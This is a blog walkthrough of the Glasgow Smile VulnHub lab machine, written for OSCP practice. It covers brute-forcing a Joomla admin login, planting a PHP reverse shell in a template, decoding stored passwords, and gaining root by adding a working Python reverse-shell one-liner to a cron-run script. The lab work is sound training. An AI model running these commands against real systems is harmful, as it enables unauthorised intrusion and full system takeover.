---
title: "Glasgow Smile"
date: 2020-06-25
layout: "writeup"
difficulty: "Medium"
excerpt: "Walkthrough for the Glasgow Smile VM"
os: "Linux"
platform: "VulnHub"
tags: [vulnhub, Glasgow Smile, Boot2Root]
comments: false
---

In order to start preparing for my eventual goal of completing the OSCP, I have started to do my best to break into various boxes found on the <a href="https://www.vulnhub.com">VulnHub</a> website.

The first box I selected was named Glasgow Smile, which is labeled as an OSCP style box with several flags of varying challenge levels from easy to intermediate.

## Reconnaissance & Scanning

After importing into VMware Workstation and booting up the machine, you are presented with the following screen, which will provide you with the IP address of this host.

![Glasgow Smile Login](/images/Glasgow1.png)

This can also be achieved another way, with netdiscover as shown below:

![Glasgow Smile netdiscover](/images/Glasgow2.png)

Now that we have located the IP address of our target, we can proceed with performing an **nmap** scan to search for open ports, protocols and their versions.

nmap will show you that there is both SSH and Apache running which is hosting a website.

![Glasgow Smile nmap](/images/Glasgow3.png)

Visiting the website presents you with a page featuring the Joker, but nothing else is immediately visible/accessible from this page.

![Glasgow Smile Main Page](/images/Glasgow4.png)

At this point, you can use one of several tools to enumerate the website. I selected **dirb** which resulted in uncovering that Joomla is installed.

![Glasgow Smile dirb](/images/Glasgow5.png)

Navigation to this directory presents a page with portions of the dialogue from the movie, "Joker". 

![Glasgow Smile joomla](/images/Glasgow6.png)

At this point, I ran **joomscan** to see if it could uncover anything interesting that could be exploited. Unfortunately, there wasn't anything uncovered that was exploitable.

![Glasgow Smile joomscan](/images/Glasgow7.png)

However, we now knew the location of the administrator login page. Next, I turned my attention back to the main Joomla page to run **cewl** to parse the main Joomla page for words 6 characters or longer. This was so these could be used as potential credentials for logging into the admin portal.

![Glasgow Smile cewl](/images/Glasgow8.png)

Next, I launched **Burp Suite** and navigated to the admin login page and put in fake credentials so we could capture the request/response. I was able to capture the format of the request.

![Glasgow Smile Burp](/images/Glasgow9.png)

Next, I sent this to **Intruder** for attempts at cracking the login credentials. Once in **Intruder**, I cleared all of the payload positions and selected only the passwd field.

![Glasgow Smile Burp Intuder](/images/Glasgow10.png)

I then clicked on the **Payloads** tab and imported the word list from cewl.

![Glasgow Smile Burp Payload](/images/Glasgow11.png)

Once imported, I started the attack. It did not produce any results with admin or administrator as the username, but when it was changed to joomla, we were able to uncover a set of login credentials. This was done by sorting the response file by length and looking for the one that was a different size than the rest.

![Glasgow Smile Burp Attack](/images/Glasgow12.png)

We were able to recover user credentials of:

**Username:** joomla and **Password:** Gotham

These credentials were then used to login to the admin page, where we discovered these were Super Administrator credentials.

![Glasgow Smile Joomla Admin](/images/Glasgow13.png)

## Exploitation and Privilege Escalation

The next step at this point is to get a reverse shell back to our attacker computer. Clicking on Templates on the left hand side shows you all the templates installed and which one is currently in use. The template that is used for the entire site is **protostar**. 

![Glasgow Smile Joomla Template](/images/Glasgow14.png)

Clicking on Templates on the left hand menu followed by Protostar Details and Files will show you all the files currently used for this theme.

![Glasgow Smile Joomla Template Files](/images/Glasgow15.png)

From here, I clicked on index.php, and deleted all the info in the file. Then I pasted in the PHP Reverse Shell from [PenTestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and modified it to point to the appropriate IP address and port on my attacker computer. Once modified, I clicked on Save.

![Glasgow Smile Rev Shell](/images/Glasgow16.png)

Back on the attacker PC, I created a **netcat** listener on the port specified in the PHP Reverse Shell.

![Glasgow Smile netcat listener](/images/Glasgow17.png)

I then navigated to the shell.php file just created located at http://192.168.68.136/joomla which launches the reverse shell back on the attacking computer.

![Glasgow Smile connection established](/images/Glasgow18.png)

This is a non-interactive shell, so python was used to create an interactive shell with the following command: `python -c 'import pty; pty.spawn("/bin/bash")'`. You should now have an interactive shell as user www-data. Next we will look for database credentials in the main joomla configuration file to see what other credentials can be uncovered. This is located at **/var/www/joomla2/configuration.php**

![Glasgow Smile joomla configuration](/images/Glasgow19.png)

We will now log into the database and see what information can be found.

![Glasgow Smile database login](/images/Glasgow20.png)

`show databases;` will list the available databases.

![Glasgow Smile databases](/images/Glasgow21.png)

`use batjoke;` will select the batjoke database.

![Glasgow Smile select database](/images/Glasgow22.png)

`show tables;` will show all the tables in the batjoke database. Two tables are present, equipment and taskforce.

![Glasgow Smile show tables](/images/Glasgow23.png)

`select * from equipment;` returns no results, but `select * from taskforce` returns a list of users. 

![Glasgow Smile show taskforce](/images/Glasgow24.png)

rob's password is base64 encoded. This can be decoded with `echo -n Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/|base64 -d`.

This return's rob's password: **???AllIHaveAreNegativeThoughts???**

![Glasgow Smile rob password](/images/Glasgow25.png)

From here, you can now ssh as rob to the machine and uncover the first flag **user.txt**.

![Glasgow Smile rob flag](/images/Glasgow26.png)

In this same folder is a file named **Abnerineedyourhelp**. Using cat on this file shows encoded text:

![Glasgow Smile Abnerineedyourhelp](/images/Glasgow27.png)

This text is a Caesar cipher. If you do a -1 step on it you are able to decode the message, which appears to contain another base64 encoded password.

![Glasgow Smile Abnerineedyourhelp decoded](/images/Glasgow28.png)

This can be decoded with `echo -n STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==|base64 -d` from terminal.

![Glasgow Smile abner password](/images/Glasgow29.png)

This returns abner's password of **I33hope99my0death000makes44more8cents00than0my0life0**

You can now use `su abner` to switch to abner's user account. From here, you can navigate to his home directory **/home/abner** and cat the **user2.txt** flag.

![Glasgow Smile abner user2](/images/Glasgow30.png)

There is also another file present in this directory **info.txt**

This file doesn't really provide any info that is helpful, as it just tells you where the term Glasgow Smile comes from.

![Glasgow Smile abner info](/images/Glasgow31.png)

Next, I reviewed abner's **.bash_history** file and noticed it mentioned two different file names, **.dear_penguins.zip** and **dear_penguins**.

![Glasgow Smile abner bash history](/images/Glasgow32.png)

It appears that some useful info might be present in this zip file, so I did a recursive search with `find /var/www/ -name ".dear*" -print'` to find the .dear_penguins.zip file. It was located under **/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip**. Since this directory is owned be root, we cannot extract it here, so we copy it to abner's home directory.

![Glasgow Smile abner copy dear_penguins](/images/Glasgow33.png)

Next, from abner's home directory, unzip the .dear_penguins.zip file with abner's password. Upon viewing the file, it appears there is a password of **scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz** listed in the last line of the file.

![Glasgow Smile abner dear_penguins text](/images/Glasgow34.png)

However, we are not sure what the username is at this point. Fortunately, it is easily determined by navigating up a folder and listing the directory contents with ls. The only user we do not have access to at this point is penguin.

![Glasgow Smile ls home](/images/Glasgow35.png)

Using `su penguin` and the text from the dear_penguins file gets us access to penguin.

![Glasgow Smile penguin access](/images/Glasgow36.png)

In penguin's home directory is a folder named **SomeoneWhoHidesBehindAMask**. Navigating to that directory is where the user3.txt file is located.

![Glasgow Smile user3](/images/Glasgow37.png)

In this same folder is a file named PeopleAreStartingToNotice.txt which contains the following.

![Glasgow Smile PeopleAreStartingToNotice](/images/Glasgow38.png)

This note from Joker mentions needing root access to run. There is a find file that can run as root in the same directory, but this is a rabbit hole and doesn't seem to be used for anything. However, running ls -al shows a hidden file named **.trash_old**.

![Glasgow Smile PeopleAreStartingToNotice](/images/Glasgow39.png)

Upon viewing this file, it appears that it is an attempt at a script, but it has a few pieces of information missing. The initial line is missing the ! before /bin/sh and it appears that the only command that is being ran is exit 0 in this file.

![Glasgow Smile trash_old](/images/Glasgow40.png)

I wasn't sure if this was another rabbit hole, so I copied over pspy with `scp pspy64 penguin@192.168.68.136:/home/penguin` to place it in penguin's home folder.

![Glasgow Smile copy pspy64](/images/Glasgow41.png)

I then moved back to penguin's home directory and made pspy64 executable and launched the program.

![Glasgow Smile launch pspy64](/images/Glasgow42.png)

After a few minutes, it became apparent that the .trash_old file was not a rabbit hole, as there was a cron job running it once a minute.

![Glasgow Smile pspy64 trash_old](/images/Glasgow43.png)

Now that we know this runs as root, we add the ! before /bin/sh, comment out the exit 0 command, and add in this 1 liner to create a reverse shell `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.68.135",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

![Glasgow Smile update trash_old](/images/Glasgow44.png)

In another terminal window on the attacker machine, run `nc -nvlp 7777` and within a couple of minutes you will have a root connection.

![Glasgow Smile root](/images/Glasgow45.png)

Now, all that's left is to `cat root.txt`.

![Glasgow Smile root.txt](/images/Glasgow46.png)








